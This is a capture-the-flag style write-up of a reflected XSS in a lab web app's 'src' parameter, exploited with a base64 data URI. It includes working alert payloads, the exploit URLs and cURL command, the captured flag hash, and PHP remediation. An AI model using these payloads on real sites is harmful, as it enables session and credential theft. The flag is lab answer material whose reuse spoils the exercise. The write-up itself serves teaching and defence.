# Reflected XSS via Data URI — Documentation

## How I Found It

**Initial reconnaissance:**
- Visited `http://192.168.1.16/index.php?page=media&src=nsa`
- Noticed `src` parameter controls displayed content
- Tested normal values → Limited options

**Testing for XSS:**
- Created payload: `<script>alert(42)</script>`
- Encoded as base64: `PHNjcmlwdD5hbGVydCg0Mik8L3NjcmlwdD4=`
- Injected as data URI: `data:text/html;base64,PHNjcmlwdD5hbGVydCg0Mik8L3NjcmlwdD4=`
- Server reflected without sanitization → Flag revealed

## How I Exploited It

**Payload creation:**
```bash
echo -n '<script>alert(42)</script>' | base64
# Output: PHNjcmlwdD5hbGVydCg0Mik8L3NjcmlwdD4=
```

**Method 1: Browser**
```
http://192.168.1.16/index.php?page=media&src=data:text/html;base64,PHNjcmlwdD5hbGVydCg0Mik8L3NjcmlwdD4=
```

**Method 2: cURL**
```bash
curl "http://192.168.1.16/index.php?page=media&src=data:text/html;base64,PHNjcmlwdD5hbGVydCg0Mik8L3NjcmlwdD4="
```

**Alternative payloads:**
```bash
# <img src=x onerror=alert(1)>
echo -n '<img src=x onerror=alert(1)>' | base64

# <svg onload=alert(42)>
echo -n '<svg onload=alert(42)>' | base64
```

**Flag obtained:**
```
928d819fc19405ae09921a2b71227bd9aba106f9d2d37ac412e9e5a750f1506d
```

## Why It Works

**Vulnerabilities:**
1. **Unfiltered input** → User input reflected without sanitization
2. **Data URI allowed** → Browser executes `data:` URIs as content
3. **No XSS protection** → No Content-Security-Policy
4. **Direct output** → Input embedded directly in HTML

**Real-world impact:**
- Session hijacking (steal cookies)
- Credential theft (keylogger, fake login)
- Page defacement
- Malware distribution

## How to Fix It

**Core principle:** Never trust user input. Validate input, escape output, block dangerous patterns.

**Essential fixes:**
1. **Input validation** - Whitelist allowed values only
2. **Block data URIs** - Reject `data:` scheme
3. **Output escaping** - Use `htmlspecialchars()` for all output
4. **Content-Security-Policy** - Prevent inline scripts
5. **HTTPOnly cookies** - Protect session cookies from JavaScript

**Example:**
```php
// ✗ BAD - Direct output
echo "<img src='" . $_GET['src'] . "' />";

// ✓ GOOD - Whitelist + escape
$allowed = ['nsa', 'obama', 'trump'];
$src = $_GET['src'] ?? '';
if (in_array($src, $allowed)) {
    echo "<img src='" . htmlspecialchars($src, ENT_QUOTES) . "' />";
}

// Block data URIs
if (preg_match('/^data:/i', $_GET['src'])) {
    die("Data URIs not allowed");
}
```

## References

- OWASP XSS Prevention Cheat Sheet — https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html
- CWE-79 — https://cwe.mitre.org/data/definitions/79.html
- OWASP A03:2021 – Injection — https://owasp.org/Top10/A03_2021-Injection/
- CWE-79: Improper Neutralization of Input (XSS)
- OWASP A03:2021 – Injection